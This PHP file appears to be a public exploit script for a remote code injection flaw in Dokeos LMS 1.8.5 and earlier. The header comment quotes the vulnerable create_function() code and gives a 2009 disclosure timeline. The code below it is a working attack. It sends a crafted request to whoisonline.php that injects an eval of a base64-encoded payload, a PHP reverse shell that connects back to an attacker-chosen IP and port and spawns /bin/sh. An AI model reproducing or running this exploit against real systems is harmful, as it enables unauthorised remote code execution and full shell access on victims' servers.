<?php

/*
	-----------------------------------------------------------------------
	Dokeos LMS <= 1.8.5 (whoisonline.php) Remote PHP Code Injection Exploit
	-----------------------------------------------------------------------
	
	author...: EgiX
	mail.....: n0b0d13s[at]gmail[dot]com
	
	link.....: http://www.dokeos.com/

	This PoC was written for educational purpose. Use it at your own risk.
	Author will be not responsible for any damage.

	[-] vulnerable code in /main/inc/lib/tablesort.lib.php

	86.		function sort_table($data, $column = 0, $direction = SORT_ASC, $type = SORT_REGULAR)
	87.		{
	88.			if(!is_array($data) or count($data)==0){return array();}
	89.			switch ($type)
	90.			{
	91.				case SORT_REGULAR :
	92.					if (TableSort::is_image_column($data, $column))
	93.					{
	94.						return TableSort::sort_table($data, $column, $direction, SORT_IMAGE);
	95.					}
	96.					elseif (TableSort::is_date_column($data, $column))
	97.					{
	98.						return TableSort::sort_table($data, $column, $direction, SORT_DATE);
	99.					}
	100.					elseif (TableSort::is_numeric_column($data, $column))
	101.					{
	102.						return TableSort::sort_table($data, $column, $direction, SORT_NUMERIC);
	103.					}
	104.					return TableSort::sort_table($data, $column, $direction, SORT_STRING);
	105.					break;
	106.				case SORT_NUMERIC :
	107.					$compare_function = 'strip_tags($el1) > strip_tags($el2)';
	108.					break;
	109.				case SORT_STRING :
	110.					$compare_function = 'strnatcmp(TableSort::orderingstring(strip_tags($el1)), [...]
	111.					break;
	112.				case SORT_IMAGE :
	113.					$compare_function = 'strnatcmp(TableSort::orderingstring(strip_tags($el1,"<img>")), [...]
	114.					break;
	115.				case SORT_DATE :
	116.					$compare_function = 'strtotime(strip_tags($el1)) > strtotime(strip_tags($el2))';
	117.			}
	118.			$function_body = '$el1 = $a['.$column.']; $el2 = $b['.$column.']; return ('.$direction.' == SORT_ASC [...]
	119.			// Sort the content
	120.			usort($data, create_function('$a,$b', $function_body));
	121.			return $data;
	122.		}

	Input parameter passed to whoisonline.php isn't properly sanitised before being used in a call to
	"create_function()" at line 120. This can be exploited to inject and execute arbitrary PHP code.
	[See http://www.securityfocus.com/bid/31398 also PHP 5.2.9 seems to be still vulnerable to this bug!]
	Others attack vectors might be possible with a valid registered account.

	[-] Disclosure timeline:
		
	[10/04/2009] - Bug discovered
	[13/04/2009] - Vendor contacted but no response
	[16/04/2009] - Vendor contacted again still no response
	[21/04/2009] - Public disclosure

*/

error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);

function http_send($host, $packet)
{
	if (($s = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) == false)
	  die("\nsocket_create(): " . socket_strerror($s) . "\n");

	if (socket_connect($s, $host, 80) == false)
	  die("\nsocket_connect(): " . socket_strerror(socket_last_error()) . "\n");

	socket_write($s, $packet, strlen($packet));
	while ($m = socket_read($s, 2048)) $response .= $m;

	socket_close($s);
	return $response;
}

print "\n+--------------------------------------------------------------------+";
print "\n| Dokeos LMS <= 1.8.5 (reverse shell) Code Injection Exploit by EgiX |";
print "\n+--------------------------------------------------------------------+\n\n";

if ($argc < 4)
{
	print "\nUsage......: php $argv[0] <host> <path> <local IP> [port]\n";
	print "\nExample....: php $argv[0] localhost /dokeos/ 192.168.0.2";
	print "\nExample....: php $argv[0] localhost / 192.168.0.2 12345\n";
	die();
}

$host = $argv[1];
$path = $argv[2];
$ip   = $argv[3];
$port = isset($argv[4]) ? (int)$argv[4] : 4444;

// reverse shell based on http://pentestmonkey.net/tools/php-reverse-shell/
$code =
"c2V0X3RpbWVfbGltaXQoMCk7CmluaV9zZXQoJ2RlZmF1bHRfc29ja2V0X3RpbWVvdXQnLCA1KTsKC" .
"iRpcCA9ICRfU0VSVkVSW0hUVFBfSVBdOwokcG9ydCA9ICRfU0VSVkVSW0hUVFBfUE9SVF07CiRjaH" .
"Vua19zaXplID0gMjA0ODsKCmlmICghKCRzb2NrID0gZnNvY2tvcGVuKCRpcCwgJHBvcnQpKSkgZGl" .
"lKCdbZXJyXUNvbm5lY3Rpb24gdG8geyRpcH06eyRwb3J0fSByZWZ1c2VkJyk7CiRkZXNjcmlwdG9y" .
"c3BlYyA9IGFycmF5KDAgPT4gYXJyYXkoJ3BpcGUnLCAncicpLCAxID0+IGFycmF5KCdwaXBlJywgJ" .
"3cnKSwgMiA9PiBhcnJheSgncGlwZScsICd3JykpOwppZiAoIWlzX3Jlc291cmNlKCgkcHJvY2Vzcy" .
"A9IHByb2Nfb3BlbignL2Jpbi9zaCAtaScsICRkZXNjcmlwdG9yc3BlYywgJHBpcGVzKSkpKSBkaWU" .
"oJ1tlcnJdQ2FuXCd0IHNwYXduIHNoZWxsJyk7CgpzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1sw" .
"XSwgMCk7CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcGVzWzFdLCAwKTsKc3RyZWFtX3NldF9ibG9ja" .
"2luZygkcGlwZXNbMl0sIDApOwpzdHJlYW1fc2V0X2Jsb2NraW5nKCRzb2NrLCAwKTsKCndoaWxlIC" .
"ghZmVvZigkc29jaykgJiYgIWZlb2YoJHBpcGVzWzFdKSkgewoJJHJlYWRfYSA9IGFycmF5KCRzb2N" .
"rLCAkcGlwZXNbMV0sICRwaXBlc1syXSk7CgkkbnVtX2NoYW5nZWRfc29ja2V0cyA9IHN0cmVhbV9z" .
"ZWxlY3QoJHJlYWRfYSwgJHdyaXRlX2EsICRlcnJvcl9hLCBudWxsKTsKCglpZiAoaW5fYXJyYXkoJ" .
"HNvY2ssICRyZWFkX2EpKSB7CgkJJGlucHV0ID0gZnJlYWQoJHNvY2ssICRjaHVua19zaXplKTsKCQ" .
"lmd3JpdGUoJHBpcGVzWzBdLCAkaW5wdXQpOwoJfQoJaWYgKGluX2FycmF5KCRwaXBlc1sxXSwgJHJ" .
"lYWRfYSkpIHsKCQkkaW5wdXQgPSBmcmVhZCgkcGlwZXNbMV0sICRjaHVua19zaXplKTsKCQlmd3Jp" .
"dGUoJHNvY2ssICRpbnB1dCk7Cgl9CglpZiAoaW5fYXJyYXkoJHBpcGVzWzJdLCAkcmVhZF9hKSkge" .
"woJCSRpbnB1dCA9IGZyZWFkKCRwaXBlc1syXSwgJGNodW5rX3NpemUpOwoJCWZ3cml0ZSgkc29jay" .
"wgJGlucHV0KTsKCX0KfQoKZmNsb3NlKCRzb2NrKTsKZmNsb3NlKCRwaXBlc1swXSk7CmZjbG9zZSg" .
"kcGlwZXNbMV0pOwpmY2xvc2UoJHBpcGVzWzJdKTsKcHJvY19jbG9zZSgkcHJvY2Vzcyk7CmRpZTsK";

$packet  = "GET {$path}whoisonline.php?tablename_column=0];}eval(base64_decode(\$_SERVER[HTTP_CODE]));%23 HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Code: {$code}\r\n";
$packet .= "IP: {$ip}\r\n";
$packet .= "Port: {$port}\r\n";
$packet .= "Connection: close\r\n\r\n";

$response = http_send($host, $packet);

if (preg_match("/\[err\](.*)/", $response, $match)) die("[-] Exploit failed ({$match[1]})\n");
if (preg_match("/<\/html>/", $response)) die("[-] Exploit failed (No users online)\n");

?>


